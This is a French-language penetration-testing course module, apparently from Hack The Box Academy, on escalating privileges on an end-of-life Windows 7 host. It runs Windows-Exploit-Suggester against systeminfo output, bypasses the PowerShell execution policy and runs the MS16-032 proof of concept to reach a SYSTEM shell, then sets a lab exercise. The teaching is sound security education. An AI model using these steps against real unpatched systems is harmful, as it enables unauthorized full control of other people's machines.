Versions de bureau Windows
========================

* * * * *

Windows 7 est arrivé en fin de vie le 14 janvier 2020, mais il est toujours utilisé dans de nombreux environnements.

* * * * *

Windows 7 par rapport aux versions plus récentes
-------------------------------------

Au fil des ans, Microsoft a ajouté des fonctionnalités de sécurité améliorées aux versions ultérieures de Windows Desktop. Le tableau ci-dessous montre quelques différences notables entre Windows 7 et Windows 10.

| Caractéristique | Windows 7 | Windows 10 |
| --- | --- | --- |
| [Mot de passe Microsoft (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/) | | X |
| [BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview) | Partielle | X |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) | | X |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard) | | X |
| [Device Guard (intégrité du code)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419) | | X |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) | Partielle | X |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security) | Partielle | X |
| [Control Flow Guard] (https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) | | X |

* * * * *

Étude de cas Windows 7
--------------------

À ce jour, les estimations indiquent qu'il pourrait y avoir encore plus de 100 millions d'utilisateurs sur Windows 7. Selon [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), en novembre 2020 , Windows 7 était le deuxième système d'exploitation de bureau le plus utilisé après Windows 10. Windows 7 est standard dans les grandes entreprises des secteurs de l'éducation, de la vente au détail, des transports, de la santé, de la finance, du gouvernement et de la fabrication.

Comme indiqué dans la dernière section, en tant que testeurs d'intrusion, nous devons comprendre le cœur de métier, l'appétit pour le risque et les limites de nos clients qui peuvent les empêcher de supprimer complètement toutes les versions des systèmes EOL tels que Windows 7. Ce n'est pas assez bon pour nous pour leur donner simplement une conclusion pour un système EOL avec la recommandation de mise à niveau/mise hors service sans aucun contexte. Nous devrions avoir des discussions continues avec nos clients lors de nos évaluations pour acquérir une compréhension de leur environnement. Même si nous pouvons attaquer/élever les privilèges sur un hôte Windows 7, il peut y avoir des mesures qu'un client peut prendre pour limiter l'exposition jusqu'à ce qu'il puisse quitter le(s) système(s) EOL.

Un grand client de vente au détail peut avoir des appareils Windows 7 intégrés dans des centaines de ses magasins exécutant ses systèmes de point de vente (POS). Il n'est peut-être pas financièrement possible pour eux de les mettre à niveau tous en même temps, nous devrons donc peut-être travailler avec eux pour développer des solutions pour atténuer le risque. Un grand cabinet d'avocats avec un ancien système Windows 7 peut être en mesure de le mettre à niveau immédiatement ou même de le supprimer du réseau. Le contexte est important.

Regardons un hôte Windows 7 que nous pourrions découvrir dans l'un des secteurs mentionnés ci-dessus. Pour notre cible Windows 7, nous pouvons à nouveau utiliser `Sherlock` comme dans l'exemple Server 2008, mais examinons [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

#### Installer les dépendances Python (VM locale uniquement)

Cet outil fonctionne sur la Pwnbox, mais pour le faire fonctionner sur une version locale de Parrot, nous devons procéder comme suit pour installer les dépendances nécessaires.

Installer les dépendances Python (VM locale uniquement)

```
dsgsec@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
dsgsec@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
dsgsec@htb[/htb]$ cd setuptools-2.0/
dsgsec@htb[/htb]$ sudo python2.7 setup.py install

dsgsec@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
dsgsec@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz
dsgsec@htb[/htb]$ cd xlrd-1.0.0/
dsgsec@htb[/htb]$ sudo python2.7 setup.py install

```

#### Collecte de la sortie de la commande Systeminfo

Une fois cela fait, nous devons capturer la sortie de la commande `systeminfo` et l'enregistrer dans un fichier texte sur notre machine virtuelle d'attaque.

Collecte de la sortie de la commande Systeminfo

```
C:\htb> systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          5/13/2021, 5:14:12 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows

<SNIP>

```

#### Mise à jour de la base de données locale des vulnérabilités Microsoft

Nous devons ensuite mettre à jour notre copie locale de la base de données Microsoft Vulnerability. Cette commande enregistrera le contenu dans un fichier Excel local.

Mise à jour de la base de données locale des vulnérabilités Microsoft

```
dsgsec@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update

```

#### Exécution de Windows Exploit Suggester

Une fois cela fait, nous pouvons exécuter l'outil sur la base de données de vulnérabilités pour vérifier les failles potentielles d'escalade de privilèges.

Exécution de l'outil de suggestion d'exploits Windows

```
dsgsec@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-059: Security Update for Windows Media Center (3150220) - Important
[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC
[*] 
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 

<SNIP>

[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[*] done

```

Supposons que nous ayons obtenu un shell Meterpreter sur notre cible en utilisant le framework Metasploit. Dans ce cas, nous pouvons également utiliser ce [module de suggestion d'exploit local](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get- more/) ce qui nous aidera à trouver rapidement tous les vecteurs potentiels d'escalade de privilèges et à les exécuter dans Metasploit si un module existe.

En parcourant les résultats, nous pouvons voir une liste assez longue, quelques modules Metasploit et quelques exploits PoC autonomes. Nous devons filtrer le bruit, supprimer tous les exploits de déni de service et les exploits qui n'ont pas de sens pour notre système d'exploitation cible. Celui qui ressort immédiatement comme intéressant est le MS16-032. Une explication détaillée de ce bogue peut être trouvée dans cet [article de blog Project Zero](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) qui est un bogue dans la connexion secondaire. Service.

#### Exploitation de MS16-032 avec PowerShell PoC

Utilisons un [PowerShell PoC](https://www.exploit-db.com/exploits/39719) pour tenter d'exploiter cela et d'élever nos privilèges.

Exploitation de MS16-032 avec PowerShell PoC

```
PS C:\htb> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

#### Création d'une console SYSTEM

Cela fonctionne et nous générons une console SYSTEM cmd.

Créer une console SYSTEM

```
C:\htb> whoami

autorité nt\système

```

* * * * *

Attaquer Windows 7
-------------------

En prenant les exemples d'énumération que nous avons parcourus dans ce module, accédez au système ci-dessous, trouvez un moyen de passer au niveau d'accès `NT AUTHORITY\SYSTEM` (il peut y avoir plus d'un moyen) et soumettez le fichier `flag.txt`  sur le bureau de l'administrateur. Après avoir reproduit les étapes ci-dessus, mettez-vous au défi d'utiliser une autre méthode pour élever les privilèges sur l'hôte cible.